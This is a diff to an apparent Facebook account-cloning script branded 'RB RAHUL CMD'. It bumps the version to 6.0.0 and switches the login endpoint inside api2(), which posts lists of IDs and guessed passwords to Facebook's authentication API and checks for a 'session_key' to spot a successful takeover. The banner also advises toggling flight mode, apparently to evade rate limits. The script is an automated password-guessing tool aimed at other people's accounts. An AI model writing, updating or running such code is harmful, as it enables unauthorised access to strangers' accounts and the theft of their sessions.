@@ -1,4 +1,3 @@
-
 from os import path
 import os,base64,zlib,pip,urllib
 print('\n\033[1;37m install modules...\n It will take some seconds...')
@@ -55,7 +54,7 @@ logo = ("""\033[1;32m
  Facebook  : RB RAHUL CMD(RB Brand)
  Status    : Free
  Tool Type : File Cloning
- Version   : 5.5.7
+ Version   : 6.0.0
 ----------------------------------------------
  Note: Use Fligt Mode ON/OFf When Start CMD 
 \033[1;37m----------------------------------------------""")
@@ -608,7 +607,7 @@ def api2(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = 'https://api.facebook.com/auth/login'
+                                url = 'https://b-api.facebook.com/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
